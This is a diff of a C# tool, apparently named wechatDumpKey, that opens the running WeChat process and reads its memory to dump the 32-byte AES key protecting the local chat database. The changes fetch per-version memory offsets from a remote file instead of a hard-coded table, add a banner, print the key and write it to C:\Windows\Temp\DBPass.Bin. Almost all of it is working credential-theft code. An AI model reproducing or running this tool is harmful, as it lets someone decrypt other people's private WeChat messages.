@@ -1,16 +1,17 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Text;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
 using System.IO;
 using System.IO.Compression;
+using System.Net;
+using System.Web.Script.Serialization;
 
 namespace wechatDumpKey
 {
     class Program
     {
-        public static Boolean Archive = false;
         //inner enum used only internally
         [Flags]
         private enum SnapshotFlags : uint
@@ -66,177 +67,73 @@ namespace wechatDumpKey
         }
         // get the parent process given a pid
 
-        public static IntPtr GetBaseAddr(IntPtr wdBaseAddr, String ver)
+
+
+
+
+        private class Studet
         {
+           public List<Lis> tables { get; set; }
+        }
+        private class Lis
+        {
+            public string ver { get; set; }
+            public string addr { get; set; }
+        }
+        
+            public static IntPtr GetBaseAddr(IntPtr wdBaseAddr, String ver)
+        {
+
             IntPtr basePtr = IntPtr.Zero;
             IntPtr padding = IntPtr.Zero;
-            int ver3 = int.Parse(ver.Split('.')[3]);
-            if (ver.StartsWith("3.5.0"))
+            try
             {
-                if (ver3 == 33)
-                {
-                    padding = (IntPtr)0x21DE374;
+                WebClient httpClient = new WebClient();
+                httpClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36");
+                ServicePointManager.SecurityProtocol = SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
+                //https://stackoverflow.com/questions/32994464/could-not-create-ssl-tls-secure-channel-despite-setting-servercertificatevalida
+                Stream Httpdata = httpClient.OpenRead("https://jihulab.com/bluesky1/padding/-/raw/main/README.md");
+
+                StreamReader reader = new StreamReader(Httpdata);
+                string jsonString = reader.ReadToEnd();
+                Httpdata.Close();
+                reader.Close();
+
+
+                /*
+                JObject m = JsonConvert.DeserializeObject<JObject>(s);
+
+                String raw = m[ver].ToString();
+
+                */
+
+
+                JavaScriptSerializer jss = new JavaScriptSerializer();
+                Studet student = jss.Deserialize<Studet>(jsonString);
+
+                foreach (Lis table in student.tables){
+                    if (table.ver.Equals(ver))
+                    {
+                        padding = new IntPtr(Convert.ToInt32(table.addr, 16));
+                        break;
+                    }
                 }
-                else if (ver3 == 29)
-                {
-                    padding = (IntPtr)0x21DD334;
-                }
+                //padding = new IntPtr(Convert.ToInt32(raw, 16));
             }
 
-            if (ver.StartsWith("3.4.0"))
+            catch (WebException E)
             {
-                if (ver3 == 38)
-                {
-                    padding = (IntPtr)0x1E2417C;
-                }
-                else if (ver3 == 54)
-                {
-                    padding = (IntPtr)0x1E3BBA4;
-                }
+                Console.WriteLine("[-] " + E.Message);
+                Environment.Exit(0);
+            }
+            catch(NullReferenceException)
+            {
+                Console.WriteLine("[-] This Version Not Support.");
+                Environment.Exit(0);
+
             }
 
-            if (ver.StartsWith("3.3.5"))
-            {
-                if (ver3 == 50)
-                {
-                    padding = (IntPtr)0x1D29B3C;
-                }
-                else if (ver3 == 42)
-                {
-                    padding = (IntPtr)0x1D2FB34;
-                }
-            }
-            else if (ver.StartsWith("3.3.0"))
-            {
-                if (ver3 >= 93 && ver3 <= 115)
-                {
-                    padding = (IntPtr)0x1DDF914;
-                }
-            }
-            else if (ver.StartsWith("3.2.1"))
-            {
-                if (ver3 == 141)
-                {
-                    padding = (IntPtr)0x1AD0D2C;
-                }
-                if (ver3 >= 154 && ver3 <= 156)
-                {
-                    padding = (IntPtr)0x1AD1F8C;
-                }
-                if (ver3 == 132)
-                {
-                    padding = (IntPtr)0x1ACFD2C;
-                }
-            }
-            else if (ver.StartsWith("3.1.0"))
-            {
-                padding = (IntPtr)0x18A297C;
-            }
-            else if (ver.StartsWith("3.0.0"))
-            {
-                if (ver3 == 57)
-                {
-                    padding = (IntPtr)0x1856E6C;
-                }
-                if (ver3 == 47)
-                {
-                    padding = (IntPtr)0x1856E8C;
-                }
-            }
 
-            if (ver.StartsWith("2."))
-            {
-                if (ver.StartsWith("2.9.0"))
-                {
-                    if (ver3 == 112)
-                    {
-                        padding = (IntPtr)0x16B4C70;
-                    }
-                    if (ver3 == 123)
-                    {
-                        padding = (IntPtr)0x16B4D50;
-                    }
-                }
-                else if (ver.StartsWith("2.9.5"))
-                {
-                    if (ver3 == 41)
-                    {
-                        padding = (IntPtr)0x17734A8;
-                    }
-                    if (ver3 == 56)
-                    {
-                        padding = (IntPtr)0x17744A8;
-                    }
-                }
-
-                else if (ver.StartsWith("2.8.0"))
-                {
-                    padding = (IntPtr)0x161CC50;
-                    if (ver3 == 121)
-                    {
-                        padding = (IntPtr)0x161CC50;
-                    }
-                    else if (ver3 == 133)
-                    {
-                        padding = (IntPtr)0x1620D10;
-                    }
-                    else if (ver3 == 116)
-                    {
-                        padding = (IntPtr)0x1618BF0;
-                    }
-                    else if (ver3 == 122)
-                    {
-                        padding = (IntPtr)0x1618BB0;
-                    }
-                    else if (ver3 == 106)
-                    {
-                        padding = (IntPtr)0x1616BF0;
-                    }
-                }
-                else if (ver.StartsWith("2.7.1"))
-                {
-                    if (ver3 == 85 || ver3 == 82)
-                    {
-                        padding = (IntPtr)0x13976C0;
-                    }
-                    if (ver3 == 88)
-                    {
-                        padding = (IntPtr)0x13976A0;
-                    }
-                }
-                else if (ver.StartsWith("2.6.8"))
-                {
-                    padding = (IntPtr)0x126DCE0;
-                    if (ver3 == 65)
-                    {
-                        padding = (IntPtr)0x126DCC0;
-                    }
-                    else if (ver3 == 53 || ver3 == 51)
-                    {
-                        padding = (IntPtr)0x126DCE0;
-                    }
-                }
-                else if (ver.StartsWith("2.6.7"))
-                {
-                    padding = (IntPtr)0x125D4B8;
-                    if (ver3 == 57)
-                    {
-                        padding = (IntPtr)0x125D4B8;
-                    }
-                }
-                else if (ver.StartsWith("2.6.6"))
-                {
-                    padding = (IntPtr)0x1131B64;
-                    if (ver3 == 28)
-                    {
-                        padding = (IntPtr)0x1131B64;
-                    }
-                }
-                else if (ver.StartsWith("2.6.3"))
-                {
-                    padding = (IntPtr)0x104F42C;
-                }
-            }
             if (padding != IntPtr.Zero)
             {
                 // basePtr = IntPtr.Add(wdBaseAddr, padding.ToInt32()); # .Net 4.0
@@ -247,40 +144,42 @@ namespace wechatDumpKey
                 Console.WriteLine("[-] This Version Not Support.");
                 Environment.Exit(0);
             }
+
             return basePtr;
+            
         }
         public static void DumpKey(int pid, MODULEENTRY32 ModEntry, String ver, IntPtr wdBaseAddr)
         {
             IntPtr KeyBase = GetBaseAddr(wdBaseAddr, ver);
+
             IntPtr procHandle = OpenProcess(0x001F0FFF, false, pid);
 
-            if (procHandle == IntPtr.Zero)
+
+                if (procHandle == IntPtr.Zero)
             {
                 var eCode = Marshal.GetLastWin32Error();
                 Console.WriteLine("[-] Error code:" + eCode);
             }
             else
             {
+                Console.WriteLine("[+] Open Process Success");
                 byte[] buffer = new byte[4];
                 int bytesread = 0;
                 ReadProcessMemory(procHandle, KeyBase, buffer, buffer.Length, ref bytesread);
-                if (Marshal.GetLastWin32Error() == 0)
+                if (Marshal.GetLastWin32Error() == 0 || Marshal.GetLastWin32Error() == 1008)
                 {
                     Array.Reverse(buffer);
                     IntPtr Pointer = new IntPtr(Convert.ToInt32(BitConverter.ToString(buffer).Replace("-", ""), 16));
-                    //Console.WriteLine("[*] Found Key Address:" + Pointer);
+                    Console.WriteLine("[*] Found Key Address:" + Pointer);
                     byte[] keyBuf = new byte[32];
                     ReadProcessMemory(procHandle, Pointer, keyBuf, 32, ref bytesread);
-                    //Console.WriteLine("[+] Key:" + BitConverter.ToString(keyBuf).Replace("-", ""));
+                    Console.WriteLine("[+] Dump AES Key Success:" + BitConverter.ToString(keyBuf).Replace("-", ""));
 
                     try
                     {
-                        String outPutName = "key.txt";
+                        String outPutName = @"C:\Windows\Temp\DBPass.Bin";
                         String buf = "0x" + BitConverter.ToString(keyBuf).Replace("-", ",0x");
-                        Console.WriteLine("----------------Key----------------");
-                        Console.WriteLine(buf);
-
-                        Console.WriteLine("-----------------------------------");
+                            //StreamWriter sr = new StreamWriter(outPutName, false, Encoding.Unicode);
                         StreamWriter sr = new StreamWriter(outPutName, false);
                         sr.Write(buf);
                         sr.Flush();
@@ -296,9 +195,22 @@ namespace wechatDumpKey
                 else
                 {
                     Console.WriteLine("[-] Error code:" + Marshal.GetLastWin32Error());
+                    Environment.Exit(0);
                 }
                 CloseHandle(procHandle);
 
+                /*
+                Array.Reverse(buffer);
+                Console.WriteLine("[*] dumping key...");
+                byte[] aesKey = new byte[32];
+                String pointer = "0x";
+                for(int i=0;i < buffer.Length; i++)
+                {
+                    pointer = pointer + buffer[i];
+                }
+                Console.WriteLine("[*] Pointer:" + pointer);
+                */
+                // ReadProcessMemory(procHandle, (IntPtr)potiner, aesKey, aesKey.Length,ref bytesread);
 
             }
         }
@@ -331,8 +243,15 @@ namespace wechatDumpKey
                         }
                     } while (Module32NextW(handleToSnapshot, ref ModEntry));
                     {
+                      //  Console.WriteLine("[*] Config Directory:" + GetWeChatDbFolder());
                     }
                 }
+                /*
+                else
+                {
+                    Console.WriteLine("[-] Error Code:" + Marshal.GetLastWin32Error());
+                }
+                */
             }
             catch (Exception ex)
             {
@@ -340,19 +259,28 @@ namespace wechatDumpKey
             }
             finally
             {
+                // Must clean up the snapshot object!
                 CloseHandle(handleToSnapshot);
             }
 
         }
 
 
-
         static void Main(String[] args)
         {
             try
             {
+                String banner = @"
+_____________________                    
+\______   \__    ___/___ _____    _____  
+ |    |  _/ |    |_/ __ \\__  \  /     \ 
+ |    |   \ |    |\  ___/ / __ \|  Y Y  \
+ |______  / |____| \___  >____  /__|_|  /
+        \/             \/     \/      \/ 
+";
+                Console.WriteLine(banner);
                 Process proc = Process.GetProcessesByName("wechat")[0];
-                Console.WriteLine("[*] Wechat Process Id:" + proc.Id);
+                Console.WriteLine("[*] Found Wechat Process Pid:" + proc.Id);
                 OpenWechatProc(proc.Id);
                 proc.Close();
                 Console.WriteLine("[+] Done.");
@@ -367,5 +295,36 @@ namespace wechatDumpKey
                 Console.WriteLine(err);
             }
         }
+
+        /*
+        [DllImport("kernel32.dll")]
+        private static extern UIntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
+
+        [DllImport("kernel32.dll")]
+        private static extern bool CloseHandle(UIntPtr hObject);
+
+        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
+        static void Main(string[] args)
+        {
+            uint PID = 11008;
+            UIntPtr handle = UIntPtr.Zero;
+            handle = OpenProcess(PROCESS_QUERY_INFORMATION, false, PID);
+            Console.WriteLine(handle);
+            if (!handle.Equals(UIntPtr.Zero))
+            {
+                CloseHandle(handle);
+            }
+            Console.ReadKey();
+
+        }
+
+
+                    * ReadProcessMemory
+                    //1.进程句柄，由OpenProcess函数获取；
+                    //2.要读出数据的地址；
+                    //3用于存放读取数据的地址；
+                    //4读出的数据大小；
+                    //5读出数据的实际大小;
+        */
     }
 }
